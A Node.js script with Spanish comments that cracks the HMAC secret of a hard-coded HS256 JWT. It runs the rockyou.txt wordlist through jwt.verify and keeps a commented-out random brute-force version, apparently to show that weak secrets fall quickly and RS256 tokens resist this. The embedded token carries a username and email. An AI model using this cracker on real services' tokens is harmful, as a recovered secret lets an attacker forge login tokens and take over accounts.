const jwt = require('jsonwebtoken');
const fs = require('fs');
// Para fuerza bruta aleatoria
const crypto = require('crypto');


// El token que deseas crackear
const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NzEyNjRhNWUyYzQ0MGM1ZDJhNjc4ZjIiLCJ1c2VybmFtZSI6Im1hdXJvODciLCJlbWFpbCI6Im1hdUBnbWFpbC5jb20iLCJpYXQiOjE3MjkyNTg2Nzh9.EholRD6IFwhW8XZxBhTzvqVqTzqindKqJUbPmVU7M34'; // Con cifrado simétrico: descifrada: 123456789 

//const token = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6OCwiaWF0IjoxNzI5MjU4NDM3LCJleHAiOjE3MjkyNjU2Mzd9.S5beczlQ4jvWk7T-6EHNJewhL-SAuvmeJ9QxaNiEBOE69RcxC0yJ1LmDcjlEY945PNhsOOfwmOcb3GSfb2f-4_ZGyrkVHk_JJT4Z8eGd6sZzYkTBwtH7IyA9JVXi-MawYepTZPiT0m5v1B-WTXaNoYaV2fdd1TJquGBWYwKywDl2UHUbG1phExcpSNbGegs1gJC2iuDbiHtIVXS9Rs30K9H6ZIdxkp1lFU61vvdjQknyFNzt2jWWr6XUpOghhwWNzbjHSRc4zuT3uP_pCnyoc7NjHWk6EGYdOGWIf-LMTr0pqu0gxIrWPAnP0cewK0jAtEdHiM-k0qD60UjeXzXwVg' // Con cifrado asimétrico imposible


// PRUEBA CON PRUEBA ALEATORIA
// Aleatorio: El tiempo necesario para probar todas las combinaciones sería aproximadamente 943, 101, 314, 367 años. Esto muestra que un ataque de fuerza bruta con tantas combinaciones sería completamente inviable en términos prácticos

// const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@-_$';
// const minPasswordLength = 4;
// const maxPasswordLength = 12;
// const triedPasswords = new Set();  // Almacena contraseñas ya intentadas
// // Función para generar una longitud aleatoria de contraseña
// function generateRandomLength(min, max) {
//     return crypto.randomInt(min, max + 1);  // Longitud entre min y max (ambos inclusive)
// }
// // Función para generar una contraseña aleatoria única
// function generateRandomPassword() {
//     let password = '';
//     do {
//         const passwordLength = generateRandomLength(minPasswordLength, maxPasswordLength);
//         password = Array.from({ length: passwordLength }, () =>
//             characters[crypto.randomInt(0, characters.length)]
//         ).join('');
//     } while (triedPasswords.has(password));  // Asegura que no se repita
//     triedPasswords.add(password);  // Almacena la contraseña generada
//     return password;
// }
// // Función para probar una contraseña generada
// function tryRandomPassword() {
//     const randomPassword = generateRandomPassword();
//     try {
//         jwt.verify(token, randomPassword);  // Suponiendo que `token` está definido
//         console.log(`¡Contraseña encontrada!: ${randomPassword}`);
//         process.exit(0);  // Detiene la ejecución si encuentra la contraseña
//     } catch (err) {
//         if (err.name !== 'JsonWebTokenError') {
//             console.error(err);  // Solo muestra el error si no es relacionado con JWT
//         }
//     }
//     console.log(`Intento: ${randomPassword}`);
// }
// // Intentar contraseñas aleatorias indefinidamente de manera eficiente
// function bruteForceRandom() {
//     console.log('Iniciando ataque de fuerza bruta con contraseñas aleatorias...');
//     setInterval(tryRandomPassword, 3);  // Intenta cada 10ms
// }
// bruteForceRandom();



// PRUEBA CON DICCIONARIO
// Cargar el diccionario
const dictionaryFile = 'rockyou.txt';
const passwords = fs.readFileSync(dictionaryFile, 'utf-8').split('\n');
// Decodificar el header y el payload (opcional, solo para ver el contenido)
const parts = token.split('.');
const header = JSON.parse(Buffer.from(parts[0], 'base64').toString('utf8'));
const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString('utf8'));
console.log('Cabecera:', header);
console.log('Payload:', payload);
// Función para probar cada contraseña
function tryPassword(password) {
    try {
        jwt.verify(token, password.trim());
        console.log(`¡Contraseña encontrada!: ${password}`);
        process.exit(0);  // Salir cuando encuentres la contraseña
    } catch (err) {
        if (err.name !== 'JsonWebTokenError') {
            console.error(err);
        }
    }
}
// También podría utilizar. npm install -g jwt-cracker
// Iterar sobre el diccionario de contraseñas
passwords.forEach(tryPassword);
// console.log('Prueba completada, no se encontró ninguna contraseña coincidente.');

